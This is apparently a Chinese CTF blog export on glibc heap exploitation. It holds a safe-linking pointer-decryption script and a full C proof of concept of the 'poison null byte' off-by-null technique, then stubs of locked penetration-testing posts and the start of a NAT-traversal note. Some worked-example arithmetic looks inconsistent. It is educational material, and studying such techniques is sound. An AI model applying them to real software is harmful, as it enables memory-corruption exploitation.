<p><code>bypass safe-linking</code>机制需要用到 <code>uaf</code>或者 <code>double free</code> 之类的漏洞, 同时释放 <code>tcache</code>到一个空闲 <code>tacahe bin</code>中, 此时由于<code>tcache bin</code> 中没有空闲<code>chunk</code>, <code>tcache-&gt;entry[tc_idx]=0</code>，若存在 <code>uaf</code> 或者 <code>double free</code>，可以泄露出 <code>leak_addr= (&amp;tcache_chunk-&gt;fd)&gt;&gt;12</code> 位置, 则 <code>heap_base=leak_addr&lt;&lt;12</code>。<code>double free</code> 需要将 <code>tcache_chunk_bk</code> 改为 <code>0</code>，绕过检查。对于 <code>2.32</code>及以后的 <code>glibc</code> 版本的 <code>tcache_poisoning</code> 需要将 <code>target</code> 地址进行加密。</p>
<h3 id="调试-25"><a href="#调试-25" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png"
                      alt="image-20231016095050228"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png"
                      alt="image-20231016095208868"
                ></p>
<p>申请<code>a,b</code>两个 <code>tcache_chunk</code>，最后一个 <code>chunk_0x10</code> 用于隔离，下面解析 <code>b_fd</code>。</p>
<ul>
<li>解密脚本:</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        bits= <span class="number">64</span>-<span class="number">12</span>*(i)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;round %d:\n&quot;</span>%(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>%key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>%plain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>%cipher)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>原理:</li>
</ul>
<p>前置:</p>
<p><code>P:0x0000_555_555_55b_2a0; L:0x0000_555_555_55b_2d0; L&gt;&gt;12:0x0000_000_555_555_55b; p&#39;:0x0000_555_000_00e_7fb</code></p>
<p><code>(0x55555555b2d0 &gt;&gt; 12) = 0x55555555B; 0x55555555b2a0 ^ 0x55555555B = 0x55500000E7FB;</code></p>
<p>步骤:</p>
<p><code>P ^ (L &gt;&gt; 12);</code>。 此时 <code>L</code> 高 <code>12</code> 位为 <code>0</code>，而 <code>P</code> 高 <code>12</code> 位为 <code>0x555</code>，异或时将保留 <code>0x0000_555</code>，而异或操作又是可逆的，所以用保留的 <code>0x0000_555_000_000_000</code> 和 低位 <code>0x0000_000_555_000_000</code> 取异或即可得到低三位的真实地址，以此类推有了以下步骤。</p>
<p>1. </p>
<p><code>bits = 52; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 52) &lt;&lt; 52 = 0x000_000_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0;</code></p>
<p>2. </p>
<p><code>bits = 40; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 40) &lt;&lt; 40 = 0x000_055_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_000_000_0</code> </p>
<p>3. </p>
<p><code>bits = 28; </code></p>
<p><code>key = 0x000_000_055_000_000_0; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_000_000_0) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_000_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_0000;</code></p>
<p>4. </p>
<p><code>bits = 16; </code></p>
<p><code>key = 0x000_000_055_555_0000; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_0000) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_5550;</code></p>
<p>5. </p>
<p><code>bits = 4; </code></p>
<p><code>key = 0x000_000_055_555_5550; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_5550) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_b2a0  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_055_555_555_b;</code></p>
<h2 id="poison-null-byte（glibc-2-28）"><a href="#poison-null-byte（glibc-2-28）" class="headerlink" title="poison_null_byte（glibc &gt; 2.28）"></a>poison_null_byte（glibc &gt; 2.28）</h2><h4 id="源码-26"><a href="#源码-26" class="headerlink" title="源码"></a>源码</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to poison null byte!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step1: allocate padding</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line">	<span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step3: link prev into largebin</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep3: Link prev into largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nCurrent Heap Layout\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    ... ...\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;padding\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span></span><br><span class="line">     	 <span class="string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free a, b, prev&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);</span><br><span class="line">	assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);</span><br><span class="line">	((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);</span><br><span class="line">	*(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step5: bypass unlinking</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take b out first by allocating 0x510&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span></span><br><span class="line">			<span class="string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;  <span class="comment">// b-&gt;fd &lt;- fake_chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span></span><br><span class="line">			<span class="string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">free</span>(a2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="type">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">// pass unlink_chunk in malloc.c:</span></span><br><span class="line">	<span class="comment">//      mchunkptr fd = p-&gt;fd;</span></span><br><span class="line">	<span class="comment">//      mchunkptr bk = p-&gt;bk;</span></span><br><span class="line">	<span class="comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">	<span class="comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And we have:\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span></span><br><span class="line">		 );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take victim out from unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, victim2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;off-by-null into the size of vicim&quot;</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span></span><br><span class="line">			<span class="string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span></span><br><span class="line">			<span class="string">&quot;add the merged chunk into unsortedbin.&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="type">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span></span><br><span class="line">			<span class="string">&quot;And it is overlapped with the prev chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);</span><br><span class="line">	<span class="built_in">memset</span>(merged, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite prev&#x27;s content&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prev2, <span class="string">&#x27;C&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(merged, <span class="string">&quot;CCCCCCCCC&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>2.29</code>后的<code>libc</code>在两个<code>free chunk</code> 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="调试-26"><a href="#调试-26" class="headerlink" title="调试"></a>调试</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之文件与IO</title>
    <url>/2024/01/22/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6IO/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e66e9c8c69eb281be35c0b6629aef3386b7fc09a29f83345dd7a45ecaf15749c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的文件IO</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Windows权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BWindows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Linux权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BLinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之内网穿透</title>
    <url>/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内⽹穿透"><a href="#内⽹穿透" class="headerlink" title="内⽹穿透"></a>内⽹穿透</h1><p>内⽹穿透，也即 NAT 穿透，进⾏ NAT 穿透是为了使具有某⼀个特定源 IP 地址和源端⼝号的数据包不被 NAT 设备屏蔽⽽正确路由到内⽹主机。</p>
<h2 id="代理概述"><a href="#代理概述" class="headerlink" title="代理概述"></a>代理概述</h2><p>代理其实就是⼀个中介，A和B本来可以直连，中间插⼊⼀个C，C就是中介，比如<code>Brupsuite</code>。</p>
<h3 id="Socks协议"><a href="#Socks协议" class="headerlink" title="Socks协议"></a>Socks协议</h3><p>中⽂意思：防⽕墙安全会话转换协议，⼯作在OSI参考模型的第5层（会话层）。<br>它是⼀种可以穿透防⽕墙的协议，因为Socks介于传输层与表示层之间，使⽤TCP协议传输数据，因⽽不提供如传递ICMP信息之类的⽹络层相关服务。Socks不⽀持ICMP，不能使⽤ping命令。</p>
<h3 id="正向代理简介"><a href="#正向代理简介" class="headerlink" title="正向代理简介"></a>正向代理简介</h3><p>正向代理类似⼀个跳板机，代理访问外部资源⽐如我们国内访问⾕歌，直接访问访问不到，我们可以通过⼀个正向代理服务器，请求发到代理服，代理服务器能够访问⾕歌，这样由代理去⾕歌取到返回数据，再返回给我们，这样我们就能访问⾕歌了。</p>
